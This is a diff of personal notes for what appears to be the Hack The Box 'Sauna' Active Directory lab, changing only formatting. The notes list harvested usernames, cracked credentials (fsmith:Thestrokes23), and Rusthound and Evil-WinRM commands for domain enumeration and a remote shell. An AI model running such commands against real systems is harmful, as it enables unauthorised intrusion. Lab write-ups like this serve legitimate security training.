@@ -22,7 +22,8 @@ Open 10.129.95.180:9389
 Domain: EGOTISTICAL-BANK.LOCAL
 
 #### HTTP
-##### Users
+__Users__
+```txt
 Fergus Smith
 Shaun Coins
 Hugo Bear
@@ -32,6 +33,7 @@ Sophie Driver
 Steven Kerb
 Johnson
 Watson
+```
 
 #### SMB
 - Anonymous login successful
@@ -79,12 +81,12 @@ hsmith
 
 _Creds:_ `fsmith:Thestrokes23`
 
-#### Rusthound
+##### Rusthound
 ```bash
 rusthound -d EGOTISTICAL-BANK.LOCAL -u fsmith@EGOTISTICAL-BANK.LOCAL -p Thestrokes23 -i $IP  -o HTB/AD/Sauna/rusthound -z
 ```
 
-#### Evil-winrm
+##### Evil-winrm
 ```bash
  evil-winrm -u fsmith -p Thestrokes23 -i $IP
 ```
